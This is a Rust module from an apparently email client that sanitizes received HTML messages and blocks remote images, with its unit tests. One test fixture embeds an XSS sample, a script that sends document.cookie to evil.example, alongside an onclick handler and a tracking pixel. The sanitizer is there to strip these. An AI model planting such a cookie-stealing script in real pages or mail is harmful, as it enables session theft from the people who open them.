//! Safe HTML for the UI (`docs/HTML_MAIL.md`): [`Engine::message_html`] is the **only** way a
//! client may obtain the HTML of a received message.
//!
//! [`crate::MessageDetail::html`] is the HTML exactly as it arrived — attacker-controlled, with
//! whatever script, CSS and tracking the sender put in it. It stays on the type because the send
//! path, quoting and the spam features read it, but a UI that renders it would be running the
//! sender's code. [`Engine::message_html`] runs it through
//! [`sealbox_mail::html::sanitize`] and hands back an [`HtmlBody`]: the sanitized markup, how
//! many remote images it contains and a plain-text rendering of the same content.
//!
//! Remote content is blocked unless the caller passes `allow_remote = true`, which a UI does
//! only after the user has asked for images on that message (the engine keeps no such state:
//! the choice belongs to the screen showing the message).

use serde::{Deserialize, Serialize};

use sealbox_mail::html::{html_to_text, looks_like_html_document, sanitize, RemoteContent};

use crate::engine::Engine;
use crate::error::Result;

/// The displayable HTML of one message, as produced by [`Engine::message_html`].
#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct HtmlBody {
    /// Sanitized HTML: only allow-listed tags and attributes, no script, no CSS, links limited
    /// to `http(s)`/`mailto` with `rel="noopener noreferrer nofollow"`, images limited to
    /// `cid:`, `data:image/*` and — when `allow_remote` was set — `http(s)`.
    pub html: String,
    /// Remote images in the message. When `allow_remote` was `false` each one is a
    /// `<span class="sealbox-blocked-image" data-src="…"></span>` placeholder in `html`, so a
    /// UI can offer "N images blocked · Load images"; nothing is fetched until it does.
    pub remote_images: u32,
    /// The same content as plain text (`html_to_text` of the sanitized HTML): for snippets,
    /// quoting, accessibility and the CLI's default view.
    pub text: String,
}

/// The message's HTML source, if it has one.
///
/// Normally [`crate::MessageDetail::html`] — but a message with no `text/plain` alternative
/// arrives with its markup in `text` and no HTML part, because mail-parser lists the HTML part
/// as a text body when it is the only one (so `mime::parse` reports it as text and the sync's
/// "html equals text" de-duplication then clears the HTML field). Until that is fixed upstream
/// of here, an HTML-only mail is recognised by
/// [`sealbox_mail::html::looks_like_html_document`] — a deliberately narrow test, so plain text
/// that merely contains `<u8>` is still plain text.
fn html_source(detail: &crate::MessageDetail) -> Option<&str> {
    if let Some(h) = detail.html.as_deref().filter(|h| !h.trim().is_empty()) {
        return Some(h);
    }
    detail
        .text
        .as_deref()
        .filter(|t| !t.trim().is_empty() && looks_like_html_document(t))
}

impl Engine {
    /// The displayable HTML body of a stored message, or `None` when it has no HTML part (or
    /// one that sanitizes to nothing, e.g. a body that was only a tracking pixel).
    ///
    /// `allow_remote` must be `true` only when the user asked for remote images on *this*
    /// message: it is what lets the sender's server see that the mail was opened.
    pub fn message_html(&self, id: i64, allow_remote: bool) -> Result<Option<HtmlBody>> {
        let detail = self.get_message(id)?;
        let Some(raw) = html_source(&detail) else {
            return Ok(None);
        };
        let remote = if allow_remote {
            RemoteContent::Allowed
        } else {
            RemoteContent::Blocked
        };
        let safe = sanitize(raw, remote);
        let text = html_to_text(&safe.html);
        if safe.html.trim().is_empty() && text.is_empty() {
            return Ok(None);
        }
        Ok(Some(HtmlBody {
            html: safe.html,
            remote_images: u32::try_from(safe.remote_images).unwrap_or(u32::MAX),
            text,
        }))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::engine::EngineConfig;
    use crate::store::{NewAccount, NewMessage, Store};
    use crate::types::{Address, AuthKind, SignatureSummary};
    use sealbox_mail::autodiscover::Endpoint;
    use sealbox_mail::Security;

    /// An engine with one account and one stored message whose HTML part is `html`.
    fn engine_with(html: Option<&str>) -> (tempfile::TempDir, Engine, i64) {
        let dir = tempfile::tempdir().unwrap();
        let engine = Engine::open_with(dir.path(), EngineConfig::default()).unwrap();
        let id = {
            let mut store = engine.store();
            let account_id = account(&store, "alice@sealbox.test");
            insert(&mut store, account_id, html)
        };
        (dir, engine, id)
    }

    fn account(store: &Store, email: &str) -> i64 {
        let ep = Endpoint::new("127.0.0.1", 3143, Security::Plain);
        store
            .insert_account(&NewAccount {
                email,
                display_name: "",
                imap: &ep,
                smtp: &ep,
                auth_kind: AuthKind::Password,
                login: email,
                credential: "pw",
            })
            .unwrap()
    }

    fn insert(store: &mut Store, account_id: i64, html: Option<&str>) -> i64 {
        let folder_id = store.folder(account_id, "INBOX").unwrap().id;
        store
            .insert_message(&NewMessage {
                html: html.map(str::to_owned),
                ..message(account_id, folder_id)
            })
            .unwrap()
            .unwrap()
    }

    /// One stored message with no bodies; fill in `text`/`html` per test.
    fn message(account_id: i64, folder_id: i64) -> NewMessage {
        NewMessage {
            account_id,
            folder_id,
            uid: 1,
            message_id: Some("html-1@sealbox.test".into()),
            from: Address {
                name: Some("Bob".into()),
                address: "bob@sealbox.test".into(),
            },
            to: vec![Address {
                name: None,
                address: "alice@sealbox.test".into(),
            }],
            cc: vec![],
            subject: Some("HTML mail".into()),
            protected_subject: false,
            date: Some(1_761_696_000),
            received_at: 1_761_696_000,
            flags: vec![],
            was_encrypted: true,
            decrypted: true,
            was_signed: false,
            signature: SignatureSummary::default(),
            signatures_json: "[]".into(),
            text: None,
            html: None,
            in_reply_to: vec![],
            references: vec![],
            decrypt_error: None,
            raw: b"raw".to_vec(),
            attachments: vec![],
        }
    }

    const MAIL: &str = "<html><head><style>p{color:red}</style></head><body>\
         <h1>Offer</h1><p onclick=\"steal()\">Hello <b>Alice</b>, \
         <a href=\"https://shop.example/x?a=1&amp;b=2\" target=\"_blank\">see this</a>.</p>\
         <script>fetch('https://evil.example/'+document.cookie)</script>\
         <img src=\"https://cdn.example/banner.png\" alt=\"Banner\">\
         <img src=\"https://t.example/pixel.gif\" width=\"1\" height=\"1\">\
         <img src=\"cid:logo@shop\" alt=\"Logo\"></body></html>";

    #[test]
    fn message_html_sanitizes_and_blocks_remote_images_by_default() {
        let (_dir, engine, id) = engine_with(Some(MAIL));
        let body = engine.message_html(id, false).unwrap().expect("html body");
        assert_eq!(
            body.remote_images, 1,
            "the tracking pixel is dropped, not counted"
        );
        assert!(!body.html.contains("script"), "{}", body.html);
        assert!(!body.html.contains("onclick"), "{}", body.html);
        assert!(!body.html.contains("style"), "{}", body.html);
        assert!(!body.html.contains("<img src=\"http"), "{}", body.html);
        assert!(
            body.html.contains(
                "<span class=\"sealbox-blocked-image\" data-src=\"https://cdn.example/banner.png\"></span>"
            ),
            "{}",
            body.html
        );
        assert!(
            body.html
                .contains("<img src=\"cid:logo@shop\" alt=\"Logo\">"),
            "{}",
            body.html
        );
        assert!(
            body.html.contains(
                "<a href=\"https://shop.example/x?a=1&amp;b=2\" rel=\"noopener noreferrer nofollow\">"
            ),
            "{}",
            body.html
        );
        assert_eq!(
            body.text,
            "Offer\n\nHello Alice, see this <https://shop.example/x?a=1&b=2>.\n\n[Logo]"
        );
        // the raw field still holds what arrived, which is why UIs must use message_html
        let raw = engine.get_message(id).unwrap().html.unwrap();
        assert!(raw.contains("<script>"), "the stored HTML is untouched");
    }

    #[test]
    fn allow_remote_keeps_the_images_and_the_count() {
        let (_dir, engine, id) = engine_with(Some(MAIL));
        let body = engine.message_html(id, true).unwrap().expect("html body");
        assert_eq!(body.remote_images, 1);
        assert!(
            body.html
                .contains("<img src=\"https://cdn.example/banner.png\" alt=\"Banner\">"),
            "{}",
            body.html
        );
        assert!(
            !body.html.contains("sealbox-blocked-image"),
            "{}",
            body.html
        );
        assert!(
            !body.html.contains("pixel.gif"),
            "a 1×1 pixel is never shown"
        );
        // only the rendering differs, not the count
        assert_eq!(
            engine
                .message_html(id, false)
                .unwrap()
                .unwrap()
                .remote_images,
            body.remote_images
        );
    }

    /// An HTML-only mail (no `text/plain` alternative) arrives with its markup in the text
    /// field; it must still be rendered as HTML, not shown as markup.
    #[test]
    fn an_html_only_mail_is_recognised_in_the_text_field() {
        let dir = tempfile::tempdir().unwrap();
        let engine = Engine::open_with(dir.path(), EngineConfig::default()).unwrap();
        let id = {
            let mut store = engine.store();
            let account_id = account(&store, "alice@sealbox.test");
            let folder_id = store.folder(account_id, "INBOX").unwrap().id;
            // exactly what the sync stores for such a mail today: text = the markup, html = None
            store
                .insert_message(&NewMessage {
                    text: Some(MAIL.to_owned()),
                    html: None,
                    ..message(account_id, folder_id)
                })
                .unwrap()
                .unwrap()
        };
        let body = engine.message_html(id, false).unwrap().expect("html body");
        assert_eq!(body.remote_images, 1);
        assert!(!body.html.contains("script"), "{}", body.html);
        assert!(body.html.contains("<h1>Offer</h1>"), "{}", body.html);
        assert!(
            body.text.starts_with("Offer\n\nHello Alice,"),
            "{:?}",
            body.text
        );
        // plain text that merely looks angular is not HTML
        let id = {
            let mut store = engine.store();
            let account_id = account(&store, "carol@sealbox.test");
            let folder_id = store.folder(account_id, "INBOX").unwrap().id;
            store
                .insert_message(&NewMessage {
                    uid: 2,
                    message_id: Some("plain-1@sealbox.test".into()),
                    text: Some("Vec::<u8>::new() and a < b\n\nBob".into()),
                    html: None,
                    ..message(account_id, folder_id)
                })
                .unwrap()
                .unwrap()
        };
        assert_eq!(engine.message_html(id, false).unwrap(), None);
    }

    #[test]
    fn no_html_part_and_empty_html_give_none() {
        for html in [
            None,
            Some(""),
            Some("   \n "),
            Some("<script>alert(1)</script>"),
        ] {
            let (_dir, engine, id) = engine_with(html);
            assert_eq!(engine.message_html(id, false).unwrap(), None, "{html:?}");
        }
        // a body that is only a tracking pixel has nothing to show either
        let (_dir, engine, id) = engine_with(Some(
            "<img src=\"https://t.example/p.gif\" width=\"1\" height=\"1\">",
        ));
        assert_eq!(engine.message_html(id, false).unwrap(), None);
    }

    #[test]
    fn an_unknown_message_is_an_error_not_an_empty_body() {
        let (_dir, engine, id) = engine_with(Some(MAIL));
        assert!(matches!(
            engine.message_html(id + 1_000, false),
            Err(crate::Error::MessageNotFound(_))
        ));
    }
}
